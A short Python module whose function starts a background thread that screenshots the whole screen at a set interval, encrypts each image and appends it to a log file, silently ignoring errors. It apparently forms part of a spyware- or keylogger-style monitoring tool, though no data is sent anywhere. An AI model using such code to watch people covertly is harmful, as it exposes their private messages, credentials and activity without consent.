import time
from PIL import ImageGrab
import os
import logger
import threading

def start_screenshot_monitor(cipher, interval=60):
    """
    Takes a full-screen screenshot every `interval` seconds,
    encrypts it, and saves to logs/screenshots.bin.
    """
    def capture_loop():
        while True:
            try:
                # Capture screenshot
                img = ImageGrab.grab()

                # Save temporarily to a PNG file in memory
                temp_path = f"temp_{int(time.time())}.png"
                img.save(temp_path)

                # Read image bytes
                with open(temp_path, "rb") as f:
                    image_data = f.read()

                # Create an encrypted + timestamped entry
                entry = logger.timestamped_bytes("IMG", image_data)
                logger.encrypt_and_write(entry, "screenshots.bin", cipher)

                # Remove temporary PNG file
                os.remove(temp_path)
            except Exception as e:
                # Optional: log error to a separate file
                pass

            time.sleep(interval)

    t = threading.Thread(target=capture_loop, daemon=True)
    t.start()
    return t
